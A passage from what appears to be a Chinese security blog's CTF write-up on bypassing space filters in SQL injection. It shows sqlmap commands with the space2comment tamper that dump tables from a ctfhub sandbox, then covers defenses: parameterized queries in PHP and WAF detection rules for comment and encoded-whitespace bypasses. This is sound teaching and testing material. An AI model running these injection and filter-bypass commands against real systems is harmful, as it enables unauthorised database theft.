+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --tamper<span style="color:#f92672">=</span>space2comment <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -D sqli -T &lt;表名&gt; -C &lt;列名&gt; --dump
+</span></span></code></pre></div><p><strong>加速技巧</strong>：time-based blind 默认延迟 5 秒，CTF 网络通常稳定，可以缩短为 2-3 秒：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --tamper<span style="color:#f92672">=</span>space2comment <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --time-sec<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --flush-session <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --tables
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>参数</th>
+					<th>说明</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>--time-sec=2</code></td>
+					<td>延迟时间从 5 秒缩短为 2 秒</td>
+			</tr>
+			<tr>
+					<td><code>--flush-session</code></td>
+					<td>清空之前的 session，用新的延迟时间重新检测</td>
+			</tr>
+	</tbody>
+</table>
+<hr>
+<h2 id="五防御建议">五、防御建议<a hidden class="anchor" aria-hidden="true" href="#五防御建议">#</a></h2>
+<h3 id="51-不要依赖过滤空格">5.1 不要依赖过滤空格<a hidden class="anchor" aria-hidden="true" href="#51-不要依赖过滤空格">#</a></h3>
+<p>过滤空格是一种<strong>治标不治本</strong>的防御手段：</p>
+<ul>
+<li>攻击者可以用 <code>/**/</code>、<code>%0a</code>、括号等多种方式绕过</li>
+<li>维护过滤规则的成本高，容易漏掉新的绕过手法</li>
+<li>误杀正常请求（如用户输入中包含合法空格）</li>
+</ul>
+<h3 id="52-正确的防御参数化查询">5.2 正确的防御：参数化查询<a hidden class="anchor" aria-hidden="true" href="#52-正确的防御参数化查询">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 错误：拼接
+</span></span></span><span style="display:flex;"><span>$id <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $_GET[<span style="color:#e6db74">&#39;id&#39;</span>]);
+</span></span><span style="display:flex;"><span>$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM users WHERE id = &#39;</span><span style="color:#e6db74">$id</span><span style="color:#e6db74">&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 正确：参数化查询
+</span></span></span><span style="display:flex;"><span>$stmt <span style="color:#f92672">=</span> $conn<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;SELECT * FROM users WHERE id = ?&#34;</span>);
+</span></span><span style="display:flex;"><span>$stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bind_param</span>(<span style="color:#e6db74">&#34;i&#34;</span>, $_GET[<span style="color:#e6db74">&#39;id&#39;</span>]);
+</span></span><span style="display:flex;"><span>$stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>();
+</span></span></code></pre></div><p>参数化查询从根本上消除了注入的可能性，无论攻击者如何绕过空格过滤都无济于事。</p>
+<h3 id="53-waf-规则的补充">5.3 WAF 规则的补充<a hidden class="anchor" aria-hidden="true" href="#53-waf-规则的补充">#</a></h3>
+<p>如果必须使用 WAF，规则应覆盖常见的空格绕过方式：</p>
+<pre tabindex="0"><code># 检测 /**/ 注释作为空格替代品
+if (request CONTAINS &#34;/*&#34; AND request CONTAINS &#34;*/&#34;) THEN inspect
+
+# 检测 URL 编码的换行和 Tab
+if (request CONTAINS &#34;%0a&#34; OR request CONTAINS &#34;%09&#34;) THEN inspect
+
+# 检测连续的 SQL 关键字（无空格分隔）
+if (request CONTAINS &#34;UNIONSELECT&#34; OR request CONTAINS &#34;SELECTFROM&#34;) THEN block
+</code></pre><p>但需注意：<strong>规则越复杂，误杀率越高</strong>，参数化查询仍然是最可靠的方案。</p>
+<hr>
+<h2 id="六总结">六、总结<a hidden class="anchor" aria-hidden="true" href="#六总结">#</a></h2>
+<p>空格过滤是 Web 应用防御 SQL 注入的常见手段，但它<strong>无法真正阻止注入</strong>，只能增加攻击者的构造成本。</p>
+<p>关键记忆点：</p>
+<ol>
+<li><strong><code>/**/</code> 是最通用的空格替代品</strong>，sqlmap 的 <code>space2comment</code> tamper 一键搞定</li>
+<li><strong>如果 <code>\s+</code> 过滤了所有空白字符</strong>，尝试用括号 <code>()</code> 包裹表达式</li>
+<li><strong>sqlmap 的 tamper 可以叠加使用</strong>，如 <code>--tamper=space2comment,between</code></li>
+<li><strong>time-based blind 可以用 <code>--time-sec</code> 缩短延迟</strong>，CTF 场景建议设为 2-3 秒</li>
+<li><strong>过滤空格治标不治本</strong>，参数化查询才是根本防御</li>
+</ol>
+<p>理解空格过滤的绕过原理，能够帮助安全测试人员在遇到 WAF 或代码层过滤时，快速找到替代方案，继续完成注入检测与利用。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/san-blog/tags/ctf/">CTF</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/waf%E7%BB%95%E8%BF%87/">WAF绕过</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/sqlmap/">Sqlmap</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/">空格过滤</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/san-blog/posts/file-upload-vulnerability/">
+    <span class="title">« Prev</span>
+    <span>文件上传漏洞实战：从无验证到 Getshell 的完整流程</span>
+  </a>
+  <a class="next" href="http://localhost:1313/san-blog/posts/http-header-sql-injection/">
+    <span class="title">Next »</span>
+    <span>HTTP Header SQL 注入全景：Cookie、User-Agent 与 Referer 的攻击面与防御</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/san-blog/">东阳的安全笔记</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
